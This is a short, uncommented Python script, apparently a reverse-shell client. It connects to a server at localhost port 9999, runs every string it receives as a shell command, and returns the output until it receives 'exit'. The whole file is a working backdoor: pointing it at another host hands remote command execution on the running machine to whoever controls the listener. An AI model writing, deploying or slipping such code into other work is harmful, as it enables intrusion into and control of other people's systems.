import socket
import subprocess as sp

ip_adress = 'localhost'
port_number = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.connect((ip_adress, port_number))

msg = "connection established"

while msg != 'exit':
    msg=server_socket.recv(2048).decode('utf-8')
    output = sp.getoutput(msg)
    if(output == '' ):
        output = "no output"
    msg = bytes(output, 'utf-8')
    server_socket.sendall(msg)

server_socket.close()